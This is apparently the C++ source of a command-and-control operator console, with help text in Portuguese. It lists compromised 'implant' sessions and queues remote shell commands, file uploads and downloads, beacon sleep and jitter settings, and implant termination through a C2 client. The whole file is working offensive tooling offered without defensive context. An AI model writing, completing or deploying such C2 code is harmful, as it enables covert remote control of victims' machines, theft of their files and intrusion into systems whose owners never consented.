#include "commands.h"
#include "protocol.h"
#include "shared/proto.h"

#include <cstdio>
#include <cstring>
#include <functional>
#include <iostream>
#include <sstream>

namespace opcli {

namespace {

C2Client g_client("127.0.0.1:8443");
std::string g_active_sid;
std::map<std::string, std::function<void(std::istringstream&)>> g_cmds;

std::vector<uint8_t> Bytes(const std::string& s) {
    return std::vector<uint8_t>(s.begin(), s.end());
}

void CmdHelp(std::istringstream&) {
    std::printf("  sessions            lista sessoes\n");
    std::printf("  use <sid>           seleciona sessao\n");
    std::printf("  shell <cmd>         executa comando\n");
    std::printf("  upload <local> <rem>\n");
    std::printf("  download <rem>\n");
    std::printf("  sleep <ms> <jitter>\n");
    std::printf("  exit                mata implant\n");
    std::printf("  quit                sai do operador\n");
}

void CmdSessions(std::istringstream&) {
    std::vector<SessionInfo> list;
    if (!g_client.Sessions(list)) { std::printf("[!] server unreachable\n"); return; }
    if (list.empty()) { std::printf("[*] nenhuma sessao\n"); return; }
    std::printf("%-34s %-20s %-16s %-8s\n", "ID", "HOST", "USER", "OS");
    for (auto& s : list) {
        std::printf("%-34s %-20s %-16s %-8s%s\n",
                    s.id.c_str(), s.host.c_str(), s.user.c_str(), s.os.c_str(),
                    s.alive ? "" : " (dead)");
    }
}

void CmdUse(std::istringstream& in) {
    std::string sid; in >> sid;
    if (sid.empty()) { std::printf("[!] use <sid>\n"); return; }
    g_active_sid = sid;
    std::printf("[*] active %s\n", sid.c_str());
}

void CmdShell(std::istringstream& in) {
    std::string rest;
    std::getline(in, rest);
    if (!rest.empty() && rest[0] == ' ') rest.erase(0, 1);
    if (g_active_sid.empty()) { std::printf("[!] use <sid> primeiro\n"); return; }
    if (g_client.Task(g_active_sid, int(proto::Op::Shell), Bytes(rest)))
        std::printf("[+] enqueued\n");
    else
        std::printf("[!] falha\n");
}

void CmdUpload(std::istringstream& in) {
    std::string local, rem; in >> local >> rem;
    if (local.empty() || rem.empty()) { std::printf("[!] upload <local> <rem>\n"); return; }
    FILE* f = fopen(local.c_str(), "rb");
    if (!f) { std::printf("[!] open local\n"); return; }
    std::vector<uint8_t> data;
    uint8_t buf[8192]; size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) data.insert(data.end(), buf, buf + n);
    fclose(f);

    std::vector<uint8_t> payload;
    payload.push_back(uint8_t(rem.size() & 0xFF));
    payload.push_back(uint8_t(rem.size() >> 8));
    payload.insert(payload.end(), rem.begin(), rem.end());
    payload.insert(payload.end(), data.begin(), data.end());

    if (g_client.Task(g_active_sid, int(proto::Op::Upload), payload)) std::printf("[+] enqueued\n");
    else std::printf("[!] falha\n");
}

void CmdDownload(std::istringstream& in) {
    std::string rem; in >> rem;
    if (rem.empty()) { std::printf("[!] download <rem>\n"); return; }
    std::vector<uint8_t> payload;
    payload.push_back(uint8_t(rem.size() & 0xFF));
    payload.push_back(uint8_t(rem.size() >> 8));
    payload.insert(payload.end(), rem.begin(), rem.end());
    if (g_client.Task(g_active_sid, int(proto::Op::Download), payload)) std::printf("[+] enqueued\n");
    else std::printf("[!] falha\n");
}

void CmdSleep(std::istringstream& in) {
    uint32_t ms = 0, j = 0;
    in >> ms >> j;
    std::vector<uint8_t> p(8);
    p[0] = uint8_t(ms);       p[1] = uint8_t(ms >> 8);
    p[2] = uint8_t(ms >> 16); p[3] = uint8_t(ms >> 24);
    p[4] = uint8_t(j);        p[5] = uint8_t(j >> 8);
    p[6] = uint8_t(j >> 16);  p[7] = uint8_t(j >> 24);
    if (g_client.Task(g_active_sid, int(proto::Op::Sleep), p)) std::printf("[+] enqueued\n");
    else std::printf("[!] falha\n");
}

void CmdExit(std::istringstream&) {
    if (g_client.Task(g_active_sid, int(proto::Op::Exit), {})) std::printf("[+] exit sent\n");
    else std::printf("[!] falha\n");
}

}

void RegisterCommands() {
    g_cmds["help"]     = CmdHelp;
    g_cmds["sessions"] = CmdSessions;
    g_cmds["use"]      = CmdUse;
    g_cmds["shell"]    = CmdShell;
    g_cmds["upload"]   = CmdUpload;
    g_cmds["download"] = CmdDownload;
    g_cmds["sleep"]    = CmdSleep;
    g_cmds["exit"]     = CmdExit;
}

bool Dispatch(const std::string& line) {
    std::istringstream in(line);
    std::string cmd;
    if (!(in >> cmd)) return true;
    if (cmd == "quit" || cmd == "q") return false;
    auto it = g_cmds.find(cmd);
    if (it == g_cmds.end()) { std::printf("[!] unknown: %s\n", cmd.c_str()); return true; }
    it->second(in);
    return true;
}

}